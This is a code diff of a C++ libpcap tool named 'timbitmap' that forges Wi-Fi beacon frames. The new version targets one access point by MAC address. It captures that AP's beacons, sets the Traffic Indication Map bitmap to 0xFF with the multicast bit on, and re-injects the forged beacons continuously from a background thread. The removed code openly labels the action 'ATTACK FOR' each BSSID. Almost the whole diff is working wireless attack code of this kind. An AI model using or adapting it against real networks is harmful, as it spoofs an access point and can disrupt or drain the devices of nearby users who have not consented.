@@ -2,6 +2,7 @@
 #include <cstdio>
 #include <chrono>
 #include <map>
+#include <thread>
 
 #include <unistd.h>
 #include <pcap.h>
@@ -13,49 +14,72 @@ typedef std::chrono::high_resolution_clock::time_point Clock;
 typedef std::chrono::high_resolution_clock::duration Diff;
 typedef std::chrono::high_resolution_clock Timer;
 
-typedef std::map<Mac, Clock> AttackMap;
-AttackMap attackMap;
+#pragma pack(push, 1)
+typedef struct {
+	RadiotapHdr radiotapHdr;
+	BeaconHdr beaconHdr;
+	char dummy[1024]; // gilgil temp
+} SendStruct;
+#pragma pack(pop)
 
 void usage() {
-	printf("syntax: timbitmap <interface>\n");
-	printf("sample: timbitmap mon0\n");
+	printf("syntax: timbitmap <interface> <ap-mac>\n");
+	printf("sample: timbitmap mon0 00:00:00:11:11:11\n");
+}
+
+void sendThread(pcap_t* handle, SendStruct ss, uint32_t writeLen) {
+	GTRACE("sendThread beg handle=%p\n", handle);
+	const u_char* p = (const u_char*)&ss;
+	BeaconHdr* beaconHdr = PBeaconHdr(p + sizeof(RadiotapHdr));
+	Diff interval = Diff(beaconHdr->fixed_.beaconInterval_ * 1024 * 1000);
+	GTRACE("interval=%ld\n", interval.count());
+
+	Diff diff;
+	Clock last = Timer::now();
+	std::this_thread::sleep_for(interval);
+	while (true) {
+		beaconHdr->seq_ += 1;
+		//GTRACE("seq=%u\n", beaconHdr->seq_);
+		int res = pcap_sendpacket(handle, (const u_char*)p, writeLen);
+		if (res != 0) {
+			GTRACE("pacp_sendpacket return %d - %s handle=%p writeLen=%u\n", res, pcap_geterr(handle), handle, writeLen);
+			exit(-1);
+		}
+		Clock now = Timer::now();
+		diff = now - last;
+		Diff sleepTime = interval * 2 - diff;
+		GTRACE("diff=%ld sleepTime=%ld\n", diff.count(), sleepTime.count());
+		std::this_thread::sleep_for(sleepTime);
+		last = now;
+	}
+	GTRACE("sendThread end\n");
 }
 
 int main(int argc, char* argv[]) {
-	if (argc < 2) {
+	if (argc != 3) {
 		usage();
 		return -1;
 	}
 
-	gtrace_close();
-	gtrace_open(nullptr, 0, true, nullptr);
+	//gtrace_close();
+	//gtrace_open(nullptr, 0, true, nullptr);
 
-	char* dev = argv[1];
+	std::string interface= argv[1];
+	Mac apMac = Mac(argv[2]);
+
 	char errbuf[PCAP_ERRBUF_SIZE];
-	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, -1, errbuf);
+	pcap_t* handle = pcap_open_live(interface.c_str(), BUFSIZ, 1, -1, errbuf);
 	if (handle == nullptr) {
-		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", dev, errbuf);
+		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", interface.c_str(), errbuf);
 		return -1;
 	}
-	if (argc >= 3) {
-		char* filter = argv[2];
-		u_int uNetMask= 0xFFFFFFFF;
-		bpf_program code;
 
-		int res = pcap_compile(handle, &code, filter, 1, uNetMask);
-		if (res < 0) {
-			fprintf(stderr, "pcap_compile return %d - %s\n", res, pcap_geterr(handle));
-			return -1;
-		}
+	typedef enum {
+		Finding,
+		Adjusting
+	} Status;
 
-		res = pcap_setfilter(handle, &code);
-		if (res < 0) {
-			fprintf(stderr, "pcap_setfilter return %d - %s\n", res, pcap_geterr(handle));
-			return -1;
-		}
-	}
-
-	Timer timer;
+	Status status = Finding;
 	while (true) {
 		struct pcap_pkthdr* header;
 		const u_char* packet;
@@ -78,75 +102,50 @@ int main(int argc, char* argv[]) {
 			continue;
 		}
 		if (len == sizeof(RadiotapHdr) || len == 13) continue;
-		BeaconHdr* beaconHdr = PBeaconHdr(packet + radiotapHdr->len_);
-		if (beaconHdr->typeSubtype() != Dot11Hdr::Beacon) continue;
 
-		//GTRACE("radio len=%d caplen=%u\n", radiotapHdr->len_, header->caplen);
+		Dot11Hdr* dot11Hdr = PDot11Hdr(packet + radiotapHdr->len_);
+		if (dot11Hdr->typeSubtype() != Dot11Hdr::Beacon) continue;
 
-		BeaconHdr::TaggedParameters::Tag* tag = &beaconHdr->tagged_.tag_;
-		while ((void*)tag < (void*)end) {
-			if (tag->num_ == BeaconHdr::tagTrafficIndicationMap) {
-				BeaconHdr::TrafficIndicationMap* tim = BeaconHdr::PTrafficIndicationMap(tag);
+		BeaconHdr* beaconHdr = PBeaconHdr(dot11Hdr);
+		Mac bssid = beaconHdr->bssid();
+		if (!(bssid == apMac)) continue;
 
-				le8_t bitmap = tim->bitmap_;
-				if (bitmap == 0xFF) {
-					//GTRACE("bitmap=0x%X\n", tim->bitmap_);
+		if (status == Finding) {
+			BeaconHdr::TaggedParameters::Tag* tag = &beaconHdr->tagged_.tag_;
+			bool bitmapChanged = false;
+			while (true) {
+				if ((void*)tag >= (void*)end) {
+					GTRACE("tag=%p end=%p\n", tag, end);
+					exit(-1);
+
+				}
+				if (tag->num_ == BeaconHdr::tagTrafficIndicationMap) {
+					BeaconHdr::TrafficIndicationMap* tim = BeaconHdr::PTrafficIndicationMap(tag);
+					tim->control_ |= 1; // multicast
+					tim->bitmap_ = 0xFF;
+					bitmapChanged = true;
 					break;
 				}
-				bool attack = true;
-				Clock now = timer.now();
-				Mac bssid = beaconHdr->bssid();
-				AttackMap::iterator it = attackMap.find(bssid);
-				if (it == attackMap.end()) {
-					attackMap.insert({bssid, now});
-					it = attackMap.find(bssid);
-					assert(it != attackMap.end());
-				} else {
-					Clock last = it->second;
-					Diff diff = now - last;
-					//GTRACE("diff=%lu\n", diff.count());
-					if (diff.count() < 5000000000) // 5 sec
-						attack = false;
-				}
-				if (attack) {
-					GTRACE("ATTACK FOR %s\n", std::string(bssid).c_str());
-
-					le16_t seq = beaconHdr->seq_;
-					le64_t timestamp = beaconHdr->fixed_.timestamp_;
-					beaconHdr->seq_ = seq + 1;
-					__useconds_t timstampIncment = beaconHdr->fixed_.beaconInterval_ * 1024;
-					beaconHdr->fixed_.timestamp_ = timestamp + le64_t(timstampIncment);
-					tim->bitmap_ = 0xFF;
-
-					char sendBuf[65536];
-					RadiotapHdr* sendRadiotapHdr = (RadiotapHdr*)sendBuf;
-					sendRadiotapHdr->len_ = sizeof(RadiotapHdr);
-					sendRadiotapHdr->pad_ = 0;
-					sendRadiotapHdr->ver_ = 0;
-					sendRadiotapHdr->present_ = 0;
-					BeaconHdr* sendBeaconHdr = PBeaconHdr(sendBuf + sizeof(RadiotapHdr));
-					uint32_t copyLen = header->caplen - radiotapHdr->len_;
-					assert(copyLen < 10000);
-					memcpy(sendBeaconHdr, beaconHdr, copyLen);
-					uint32_t writeLen = sizeof(RadiotapHdr) + copyLen;
-
-					usleep(timstampIncment - 5000); // -5 msec
-					for (int i = 0; i < 10; i++) {
-						sendBeaconHdr->fixed_.timestamp_ += 1000; // +1 msec
-						int res = pcap_sendpacket(handle, (const u_char*)sendBuf, writeLen);
-						if (res != 0) {
-							fprintf(stderr, "pacp_sendpacket return %d - %s\n", res, pcap_geterr(handle));
-						}
-						usleep(1000); // 1 msec
-					}
-					it->second = now;
-				}
-				break;
-
+				tag = tag->next();
 			}
-			tag = tag->next();
+			if (!bitmapChanged) continue;
+
+			SendStruct ss;
+			char* p = (char*)&ss;
+			RadiotapHdr* sendRadiotapHdr = PRadiotapHdr(p);
+			sendRadiotapHdr->len_ = sizeof(RadiotapHdr);
+			sendRadiotapHdr->pad_ = 0;
+			sendRadiotapHdr->ver_ = 0;
+			sendRadiotapHdr->present_ = 0;
+
+			BeaconHdr* sendBeaconHdr = PBeaconHdr(p + sendRadiotapHdr->len_);
+			uint32_t writeLen = header->caplen - (radiotapHdr->len_ - sizeof(RadiotapHdr));
+			memcpy(sendBeaconHdr, beaconHdr, writeLen);
+			std::thread* t = new std::thread(sendThread, handle, ss, writeLen); t->detach();
+			status = Adjusting;
+			//sendThread(handle, ss, writeLen);
+		} else {
 		}
 	}
-
 	pcap_close(handle);
 }
